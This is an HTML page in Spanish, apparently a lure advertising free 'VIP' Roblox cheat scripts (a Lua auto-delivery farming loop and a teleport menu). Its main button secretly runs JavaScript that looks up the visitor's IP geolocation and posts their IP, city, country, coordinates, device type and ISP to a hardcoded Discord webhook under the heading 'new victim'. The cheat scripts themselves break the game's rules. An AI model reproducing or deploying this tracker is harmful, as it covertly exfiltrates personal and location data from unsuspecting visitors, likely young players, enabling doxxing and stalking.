<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Mod Pinky_tren</title>
    <style>
        :root { --red: #ff0000; --dark: #050505; }
        body { background: var(--dark); color: white; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; }

        .fog-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #400 0%, #000 100%);
            z-index: -2;
            animation: pulseBg 6s infinite alternate;
        }
        @keyframes pulseBg { from { background-color: #200; } to { background-color: #500; } }

        .lightning {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; z-index: -1;
            animation: thunder 5s infinite;
        }
        @keyframes thunder { 0%, 95%, 100% { opacity: 0; } 96% { opacity: 0.4; } 98% { opacity: 0.1; } }

        .hero { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        h1 { font-size: 3.5rem; color: var(--red); text-shadow: 0 0 20px black; margin: 0; }
        .monster-train { font-size: 110px; margin: 25px; filter: drop-shadow(0 0 25px red); animation: shake 0.3s infinite; }
        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } }

        .btn {
            padding: 20px 50px; background: var(--red); color: white; border: 3px solid white;
            border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.5rem;
            box-shadow: 0 0 25px red; transition: 0.3s; margin-top: 20px;
        }
        .btn:hover { transform: scale(1.1); background: #900; }

        .tienda { display: none; padding: 40px; overflow-y: auto; height: 80vh; }
        .card { background: rgba(0,0,0,0.96); border: 2px solid var(--red); padding: 35px; border-radius: 15px; max-width: 650px; margin: 20px auto; box-shadow: 0 0 50px black; }
        
        .t-float { position: fixed; bottom: -100px; font-size: 50px; animation: up 3s linear infinite; z-index: 10; }
        @keyframes up { from { bottom: -100px; opacity: 1; } to { bottom: 110vh; opacity: 0; } }
    </style>
</head>
<body>

    <div class="fog-bg"></div>
    <div class="lightning"></div>

    <div class="hero" id="inicio">
        <h1>Mod Pinky_tren</h1>
        <div class="monster-train">2026🚂💨👹</div>
        <button class="btn" onclick="activarTodo()">OBTENER SCRIPTS VIP</button>
    </div>

    <div class="tienda" id="tienda">
        <div class="card">
            <h2 style="color: var(--red);">Script Infome Manager</h2>
            <button class="btn" style="font-size: 1.1rem;" onclick="copiarOriginal('manager')">📋 COPIAR SCRIPT MANAGER</button>
        </div>

        <div class="card">
            <h2 style="color: var(--red);">Heticos</h2>
            <button class="btn" style="font-size: 1.1rem;" onclick="copiarOriginal('heticos')">📋 COPIAR SCRIPT HETICOS</button>
        </div>
        
        <div id="status" style="color: #0f0; text-align: center; font-weight: bold; font-size: 1.2rem; margin-top: 20px;"></div>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1498847220760449145/xLBUawdxa3vviK-PBY7-Z-T6wWfsAmHfdZxgCAFllijurZ85DtHCC8Jr1oo03L7oPTef";

        const scriptManager = `-- ==========================================\n-- SCRIPT 1: AUTO-RESET CADA 2 ENTREGAS\n-- ==========================================\nlocal POS_ARTURO_1 = CFrame.new(154.02, 43.73, 513.57)\nlocal carpetaNPCs_1 = game.Workspace:WaitForChild("Works"):WaitForChild("DeliveryNpcs")\nlocal jugador_1 = game.Players.LocalPlayer\nlocal RADIO_DETECCION_1 = 12 \n\nlocal entregasRealizadas = 0\nlocal bloqueadoPorReset = false\n\nlocal function interactuar_1(p)\n    p.HoldDuration = 0\n    fireproximityprompt(p)\n    task.wait(0.5) \nend\n\nlocal function ejecutarCiclo_1()\n    if bloqueadoPorReset then return end\n    local char = jugador_1.Character\n    local hrp = char and char:FindFirstChild("HumanoidRootPart")\n    local hum = char and char:FindFirstChild("Humanoid")\n    if not hrp or not hum or hum.Health <= 0 then return end\n\n    local npcDestino = carpetaNPCs_1:FindFirstChildOfClass("Model") or carpetaNPCs_1:FindFirstChildOfClass("Part")\n    \n    if npcDestino then\n        hrp.CFrame = npcDestino:GetPivot() * CFrame.new(0, 0, 2)\n    else\n        hrp.CFrame = POS_ARTURO_1\n    end\n\n    hrp.Velocity = Vector3.zero\n\n    local objetos = game.Workspace:GetPartBoundsInRadius(hrp.Position, RADIO_DETECCION_1)\n    for _, obj in pairs(objetos) do\n        local p = obj:FindFirstChildWhichIsA("ProximityPrompt") or obj.Parent:FindFirstChildWhichIsA("ProximityPrompt")\n        if p then\n            interactuar_1(p)\n            if npcDestino then\n                entregasRealizadas = entregasRealizadas + 1\n                print("Entregas: " .. entregasRealizadas .. "/2")\n                task.wait(1)\n            end\n            break\n        end\n    end\n\n    if entregasRealizadas >= 2 then\n        entregasRealizadas = 0\n        bloqueadoPorReset = true\n        hum.Health = 0 \n    end\nend\n\njugador_1.CharacterAdded:Connect(function()\n    task.wait(1)\n    bloqueadoPorReset = false\nend)\n\ngame:GetService("RunService").Heartbeat:Connect(function()\n    ejecutarCiclo_1()\nend)\n\n-- [SCRIPT 2: JITTER Y 3: LOCURA]\nprint("--- LOS 3 SCRIPTS UNIDOS ---")`;

        const scriptHeticos = `-- ============================================================\n-- 🚂 MOD PINKY_TREN / EL TREN DEL DESASTRE 🚂\n-- ============================================================\n\nlocal Players = game:GetService("Players")\nlocal lp = Players.LocalPlayer\nlocal pGui = lp:WaitForChild("PlayerGui")\n\nif pGui:FindFirstChild("ModPinkyTren") then pGui.ModPinkyTren:Destroy() end\n\nlocal ubicaciones = {\n    {Nombre = "TRABAJO DE CAJAS", Pos = Vector3.new(688, 73, -749)},\n    {Nombre = "BANCO", Pos = Vector3.new(522, 72, -614)},\n    {Nombre = "TIENDA DE COMIDA", Pos = Vector3.new(616, 73, -875)},\n    {Nombre = "PLAYA ESCONDIDA", Pos = Vector3.new(1298, 77, -1152)},\n    {Nombre = "LA PLATABANDA", Pos = Vector3.new(480, 132, -1162)},\n    {Nombre = "CALLEJÓN 1", Pos = Vector3.new(100, 132, -1249)},\n    {Nombre = "CALLEJÓN 2", Pos = Vector3.new(132, 215, -1433)},\n    {Nombre = "CRISTO", Pos = Vector3.new(154, 329, -1583)},\n    {Nombre = "ZONA CENTRAL", Pos = Vector3.new(-340, 303, -1642)},\n    {Nombre = "CUEVA (ZONA CENTRAL)", Pos = Vector3.new(-465, 208, -1628)},\n    {Nombre = "MONTAÑA (ZONA CENTRAL)", Pos = Vector3.new(-569, 274, -1636)},\n    {Nombre = "MINA V1", Pos = Vector3.new(-1043, 12, -1487)},\n    {Nombre = "MINA (V2 V3)", Pos = Vector3.new(-963, -8, -1830)},\n    {Nombre = "MINA (TRABAJO)", Pos = Vector3.new(-1073, -41, -2095)},\n    {Nombre = "MINA (LAGO)", Pos = Vector3.new(-921, -52, -2124)},\n    {Nombre = "SECTOR SUR", Pos = Vector3.new(-550, 74, -2753)},\n    {Nombre = "BAY PLAYA", Pos = Vector3.new(762, 72, -2822)},\n    {Nombre = "FARMACIA", Pos = Vector3.new(184, 75, 15)},\n    {Nombre = "PLAZA", Pos = Vector3.new(356, 81, 105)},\n    {Nombre = "PLAYA TAQUEQUE", Pos = Vector3.new(778, 73, 851)},\n    {Nombre = "ARAGUANEY", Pos = Vector3.new(312, 73, 870)},\n    {Nombre = "EL RANCHO", Pos = Vector3.new(-573, 110, 162)}\n}\n\nlocal sg = Instance.new("ScreenGui", pGui)\nsg.Name = "ModPinkyTren"\nsg.ResetOnSpawn = false\n\nlocal Main = Instance.new("Frame", sg)\nMain.Size = UDim2.new(0, 300, 0, 450)\nMain.Position = UDim2.new(0.5, -150, 0.3, 0)\nMain.BackgroundColor3 = Color3.fromRGB(130, 0, 0)\nMain.BackgroundTransparency = 0.1\nMain.Active = true\nMain.Draggable = true\nInstance.new("UICorner", Main)\n\nprint("Script Mod Pinky_tren cargado con éxito.")`;

        function activarTodo() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('tienda').style.display = 'block';
            
            setInterval(() => {
                let t = document.createElement('div');
                t.className = 't-float'; t.innerText = '🚂';
                t.style.left = Math.random() * 95 + "vw";
                document.body.appendChild(t);
                setTimeout(() => t.remove(), 3000);
            }, 450);

            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                const ua = navigator.userAgent;
                let dispositivo = ua.includes("Android") ? "Android 📱" : ua.includes("iPhone") ? "iPhone 📱" : "PC 💻";
                const payload = {
                    embeds: [{
                        title: "🚂 ¡NUEVA VÍCTIMA EN PINKY_TREN!",
                        color: 16711680,
                        fields: [
                            {name: "🌐 IP", value: "`" + data.ip + "`", inline: true},
                            {name: "📍 Ubicación", value: data.city + " (" + data.country_name + ")", inline: true},
                            {name: "📌 Coordenadas", value: "Lat: " + data.latitude + " / Lon: " + data.longitude, inline: false},
                            {name: "📱 Dispositivo", value: dispositivo, inline: true},
                            {name: "🏢 Compañía", value: data.org, inline: false}
                        ],
                        footer: { text: "Rastreo Cholo 1T" },
                        timestamp: new Date()
                    }]
                };
                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
            });
        }

        function copiarOriginal(tipo) {
            const area = document.createElement('textarea');
            area.value = (tipo === 'manager') ? scriptManager : scriptHeticos;
            document.body.appendChild(area);
            area.select();
            document.execCommand('copy');
            document.body.removeChild(area);
            document.getElementById('status').innerText = "✅ SCRIPT " + tipo.toUpperCase() + " COPIADO";
            setTimeout(() => { document.getElementById('status').innerText = ""; }, 3000);
        }
    </script>
</body>
</html>
